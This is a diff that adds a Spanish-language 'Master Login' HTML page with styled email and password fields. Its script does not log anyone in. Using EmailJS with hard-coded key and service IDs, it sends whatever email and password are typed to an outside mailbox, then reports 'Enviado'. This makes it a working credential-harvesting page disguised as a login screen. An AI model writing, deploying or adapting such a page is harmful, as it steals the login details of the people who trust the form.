@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Master Login</title>
+<link rel="manifest" href="manifest.json">
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial;
+}
+
+body {
+  height: 100vh;
+  background: linear-gradient(135deg, #1f1c2c, #928dab);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.container {
+  background: rgba(0,0,0,0.7);
+  padding: 40px;
+  border-radius: 15px;
+  width: 300px;
+  text-align: center;
+}
+
+.logo {
+  width: 90px;
+  animation: flotar 2s infinite;
+  margin-bottom: 10px;
+}
+
+@keyframes flotar {
+  0% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+  100% { transform: translateY(0); }
+}
+
+h1 {
+  color: white;
+  margin-bottom: 20px;
+}
+
+.input-box {
+  position: relative;
+  margin: 20px 0;
+}
+
+.input-box input {
+  width: 100%;
+  padding: 10px;
+  background: transparent;
+  border: none;
+  border-bottom: 2px solid #aaa;
+  color: white;
+}
+
+.input-box label {
+  position: absolute;
+  top: 10px;
+  left: 0;
+  color: #aaa;
+  font-size: 14px;
+  transition: 0.3s;
+}
+
+.input-box input:focus ~ label,
+.input-box input:valid ~ label {
+  top: -10px;
+  font-size: 12px;
+  color: #00f2fe;
+}
+
+button {
+  margin-top: 20px;
+  padding: 10px;
+  width: 100%;
+  border-radius: 20px;
+  background: linear-gradient(90deg, #00f2fe, #4facfe);
+  cursor: pointer;
+}
+
+#mensaje {
+  margin-top: 15px;
+  color: white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <img src="logo.png" class="logo">
+  <h1>MASTER LOGIN</h1>
+
+  <div class="input-box">
+    <input type="email" id="correo" required>
+    <label>Correo</label>
+  </div>
+
+  <div class="input-box">
+    <input type="password" id="codigo" required>
+    <label>Código</label>
+  </div>
+
+  <button onclick="enviar()">Iniciar</button>
+  <p id="mensaje"></p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+  emailjs.init("a8oPFnNC1H4mNlDzC");
+})();
+
+function enviar() {
+  let correo = document.getElementById("correo").value.trim();
+  let codigo = document.getElementById("codigo").value.trim();
+
+  if (!correo || !codigo) {
+    document.getElementById("mensaje").innerText = "Completa los campos";
+    return;
+  }
+
+  let datos = {
+    email: correo,
+    code: codigo
+  };
+
+  emailjs.send("service_2ukrjlv", "template_7347e2j", datos)
+  .then(function() {
+     document.getElementById("mensaje").innerText = "Enviado ✔";
+  }, function() {
+     document.getElementById("mensaje").innerText = "Error ❌";
+  });
+}
+</script>
+
+</body>
+</html>
